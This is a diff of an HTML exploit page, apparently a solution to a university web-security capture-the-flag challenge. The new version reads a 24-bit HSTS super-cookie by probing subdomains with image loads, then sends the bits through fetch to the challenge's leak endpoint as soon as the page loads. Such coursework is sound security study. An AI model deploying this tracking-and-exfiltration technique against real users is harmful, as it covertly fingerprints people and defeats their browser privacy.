@@ -1,67 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Tracking ID Retrieval and Leak</title>
-    <meta charset="utf-8">
-</head>
+<head><meta charset="utf-8"><title>HSTS bits</title></head>
 <body>
-    <h1>Attempting to retrieve tracking ID...</h1>
-    <p id="status">Starting process...</p>
+<script>
+function leak(data){
+  fetch("https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data="+encodeURIComponent(data));
+}
 
-    <script>
-        // The leak function provided by the challenge
-        function leak(data) {
-            const gameServerLeakUrl = `https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`;
-            document.getElementById('status').innerText = "Attempting to leak data to game server...";
-            console.log("Leak URL:", gameServerLeakUrl);
+async function probe(n){
+  return await new Promise(r=>{
+    const img=new Image();
+    img.onload =()=>r(0);            // HTTP worked  -> bit 0
+    img.onerror=()=>r(1);            // upgraded+fail-> bit 1
+    img.src=`http://${n}.tracking.jeopardy.websec.saarland/get?${Math.random()}`;
+  });
+}
 
-            fetch(gameServerLeakUrl)
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Data leaked successfully! Check the game server logs/interface for the 24-bit string.");
-                        document.getElementById('status').innerText = "Data leaked successfully! You should have the 24-bit string now. Proceed to calculate SHA-256.";
-                    } else {
-                        console.error("Failed to leak data:", response.status, response.statusText);
-                        document.getElementById('status').innerText = `Failed to leak data: HTTP ${response.status} ${response.statusText}`;
-                    }
-                })
-                .catch(error => {
-                    console.error("Error during leak request:", error);
-                    document.getElementById('status').innerText = `Error during leak request: ${error.message}`;
-                });
-        }
-
-        async function retrieveAndLeakTrackingID() {
-            // The target URL to get the tracking ID.
-            // THIS MUST BE HTTP to avoid mixed content blocking when your exploit page is also HTTP.
-            const targetTrackingUrl = "http://0.tracking.jeopardy.websec.saarland/get"; 
-
-            try {
-                document.getElementById('status').innerText = `Fetching tracking ID from ${targetTrackingUrl}...`;
-                console.log(`Attempting to fetch from: ${targetTrackingUrl}`);
-
-                const response = await fetch(targetTrackingUrl);
-
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status} ${response.statusText}`);
-                }
-
-                const trackingID = await response.text();
-
-                console.log("Successfully retrieved 24-bit Tracking ID:", trackingID);
-                document.getElementById('status').innerText = `Tracking ID retrieved: ${trackingID}. Now initiating leak...`;
-
-                // Call the provided leak function with the retrieved data
-                leak(trackingID);
-
-            } catch (error) {
-                console.error("Error in retrieveAndLeakTrackingID:", error);
-                document.getElementById('status').innerText = `Error: ${error.message}. Please ensure this page is hosted on HTTP to avoid mixed content blocking.`;
-            }
-        }
-
-        // Execute the main function when the page loads
-        window.onload = retrieveAndLeakTrackingID;
-    </script>
+(async()=>{
+  const bits=[];
+  for(let i=0;i<24;i++) bits.push(await probe(i));
+  leak(bits.join(""));              // e.g. "11001010..."
+})();
+</script>
 </body>
 </html>
